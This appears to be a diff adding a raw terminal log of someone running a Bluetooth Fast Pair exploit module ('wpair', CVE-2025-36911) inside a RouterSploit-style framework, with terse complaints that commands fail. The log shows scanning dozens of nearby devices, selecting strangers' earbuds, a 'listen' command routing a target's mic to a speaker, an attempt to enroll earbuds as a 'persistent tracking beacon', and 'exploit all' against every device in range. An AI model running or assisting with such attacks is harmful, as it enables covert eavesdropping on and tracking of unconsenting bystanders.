@@ -1,0 +1,109 @@
+scan
+[!] Scan error: Failed
+vluetootth was off and does not let user know
+
+
+wpair [33dev sel:22 audio:idle]> target CC:4D:40:86:0B:8C
+Already in scan results — selected [2] Galaxy Buds3 Pro (F671) LE (CC:4D:40:86:0B:8C)
+wpair [33dev sel:2 audio:idle]> listen
+🎧 Listening — BT mic → speaker...
+wpair [33dev sel:2 audio:listen]> record
+Audio stopped.
+wpair [33dev sel:2 audio:idle]> fmdn
+FMDN enrollment: CC:4D:40:86:0B:8C...
+    FMDN — Enrolling device into Find Hub Network...
+    ⚠  This converts the device into a persistent tracking beacon
+[!] FMDN error: Connect failed after 3 attempts: Method "Connect" with signature "" on interface "org.bluez.Device1" doesn't exist
+ (BlueZ Device1 not ready — adapter likely needs a fresh scan, see `scan` then `target`)
+
+
+
+ these dont work
+
+
+ *] 43 global option(s) loaded (use 'show options' to view)
+rsf> use exploits/bluetooth/wpair
+Module 'exploits/bluetooth/wpair' selected.
+rsf> run
+[!] Warning: No target set.
+Do you want to provide a target address? (y/n) [y]: y
+Enter target []: 127.0.0.1
+[*] Target set to '127.0.0.1'
+Running module 'exploits/bluetooth/wpair' against target '127.0.0.1'
+Action (scan/scan-all/scan-json/test/test-json/exploit/exploit-json/aoe/aoe-json/audit/audit-json/pair, blank=interactive) []:
+⚡ WPair CVE-2025-36911 — Fast Pair REPL
+Type `help` for commands, `scan` to discover, `quit` to exit.
+
+wpair [0dev sel:- audio:idle]> target  E0:61:7B:F6:ED:E2
+AoE scan to bring in target E0:61:7B:F6:ED:E2 (15s)...
+AoE scan complete — 42 device(s) found
+Selected [41] Buds3 Pro (E0:61:7B:F6:ED:E2)
+wpair [42dev sel:41 audio:idle]> exploit
+
+
+wpair [40dev sel:18 audio:idle]> scanall
+AoE scan complete — 34 device(s) found
+
+  #   Name                     Address            RSSI  Model    Flags    Status
+  ----------------------------------------------------------------------------------
+   0  39-03-E1-D1-5B-99 (now)  39:03:E1:D1:5B:99  ▂___  —        —        NOT TESTED
+   1  07-05-75-05-CD-11 (now)  07:05:75:05:CD:11  ▂▄__  —        —        NOT TESTED
+   2  15-B5-8C-7F-CA-19 (now)  15:B5:8C:7F:CA:19  ▂___  04B3B9   —        NOT TESTED
+   3  34-1F-94-7B-FB-2C (now)  34:1F:94:7B:FB:2C  ▂▄__  04F1A0   —        NOT TESTED
+   4  44-51-D2-91-2E-0B (now)  44:51:D2:91:2E:0B  ▂___  004047   —        NOT TESTED
+   5  4A-38-06-33-39-56 (now)  4A:38:06:33:39:56  ____  —        —        NOT TESTED
+   6  2D-B2-1E-A6-3B-55 (now)  2D:B2:1E:A6:3B:55  ▂___  —        —        NOT TESTED
+   7  [TV] Living room TV (now) FC:03:9F:28:2B:97  ____  —        —        NOT TESTED
+   8  75-A3-EA-3B-56-AF (now)  75:A3:EA:3B:56:AF  ▂▄__  —        —        NOT TESTED
+   9  [Samsung] Soundbar J-S (now) 38:01:95:11:BD:68  ____  —        —        NOT TESTED
+   10 18-F5-02-77-5D-DD (now)  18:F5:02:77:5D:DD  ▂___  —        —        NOT TESTED
+  *11 2F-F5-71-73-F7-DD (now)  2F:F5:71:73:F7:DD  ▂▄__  —        AK       STEADY-STATE
+   12 22-62-63-50-EE-07 (now)  22:62:63:50:EE:07  ____  —        —        NOT TESTED
+   13 1E-2E-8E-07-FA-A4 (now)  1E:2E:8E:07:FA:A4  ____  —        —        NOT TESTED
+   14 0E-6F-32-B5-BC-48 (now)  0E:6F:32:B5:BC:48  ▂▄__  —        AK       STEADY-STATE
+   15 FA-10-25-E2-28-9F (now)  FA:10:25:E2:28:9F  ▂▄__  —        —        NOT TESTED
+   16 Ike's Buds3 Pro (now)    77:45:CE:50:68:EB  ▂___  006F00   AK       STEADY-STATE
+   17 52-E7-11-D9-49-84 (now)  52:E7:11:D9:49:84  ▂▄__  —        —        NOT TESTED
+   18 27-ED-3E-28-4A-9E (now)  27:ED:3E:28:4A:9E  ▂▄__  —        —        NOT TESTED
+   19 25-22-6E-78-24-06 (now)  25:22:6E:78:24:06  ▂▄__  —        —        NOT TESTED
+   20 03-E9-88-8B-83-14 (now)  03:E9:88:8B:83:14  ____  —        —        NOT TESTED
+   21 00-00-00-00-00-00 (now)  00:00:00:00:00:00  ▂___  —        —        NOT TESTED
+   22 4F-2D-D0-F2-BA-30 (now)  4F:2D:D0:F2:BA:30  ____  —        —        NOT TESTED
+   23 3A-8D-20-74-E9-C6 (now)  3A:8D:20:74:E9:C6  ▂▄__  —        —        NOT TESTED
+   24 EE-F2-F4-4C-D6-EC (now)  EE:F2:F4:4C:D6:EC  ▂___  —        —        NOT TESTED
+   25 17-D4-3C-08-5D-47 (now)  17:D4:3C:08:5D:47  ____  —        —        NOT TESTED
+   26 3B-75-FE-DB-53-D2 (now)  3B:75:FE:DB:53:D2  ▂▄__  —        —        NOT TESTED
+   27 4F-3F-5B-AE-74-50 (now)  4F:3F:5B:AE:74:50  ▂▄__  —        —        NOT TESTED
+   28 08-06-18-76-75-13 (now)  08:06:18:76:75:13  ▂▄__  —        —        NOT TESTED
+   29 64-FE-AA-A5-DC-F4 (now)  64:FE:AA:A5:DC:F4  ____  —        —        NOT TESTED
+   30 33-64-0B-B2-61-A5 (now)  33:64:0B:B2:61:A5  ____  0469C6   —        NOT TESTED
+   31 C4-FC-22-18-AC-4B (now)  C4:FC:22:18:AC:4B  ____  —        —        NOT TESTED
+   32 57-9F-74-5B-04-FB (now)  57:9F:74:5B:04:FB  ____  —        —        NOT TESTED
+   33 Ike's Buds3 Pro (now)    A0:B0:BD:8C:B0:1C  ____  —        —        NOT TESTED
+
+wpair [34dev sel:11 audio:idle]> pair
+Pairing 2F-F5-71-73-F7-DD (2F:F5:71:73:F7:DD)...
+Pair failed: Attempting to pair with 2F:F5:71:73:F7:DD
+[CHG] Device 4F:3F:5B:AE:74:50 RSSI: 0xffffffc2 (-62)
+[CHG] Device 4F:3F:5B:AE:74:50 ManufacturerData.Key: 0x004c (76)
+[CHG] Device 4F:3F:5B:AE:74:50 ManufacturerData.Value:
+  10 06 39 1e 6e 86 15 28                          ..9.n..(
+[CHG] Device 4A:38:06:33:39:56 RSSI: 0xffffffa6 (-90)
+[CHG] Device 4A:38:06:33:39:56 ManufacturerData.Key: 0x0075 (117)
+[CHG] Device 4A:38:06:33:39:56 ManufacturerData.Value:
+  bc c6 1d d3 c2 74 1d 52 a5 53 72 63 87           .....t.R.Src.
+Failed to pair: org.bluez.Error.InProgress
+
+
+
+wpair [40dev sel:8 audio:idle]> exploit all
+Exploiting 2F-F5-71-73-F7-DD (2F:F5:71:73:F7:DD)...
+    Connecting (attempt 1/3)...
+    Connection timed out (15000ms)
+    Retrying in 1000ms...
+    Connecting (attempt 2/3)...
+    Connect failed: In Progress
+    Retrying in 2000ms...
+    Connecting (attempt 3/3)...
+    Connect failed: In Progress
+[!] Exploit error: Failed to connect after 3 attempts
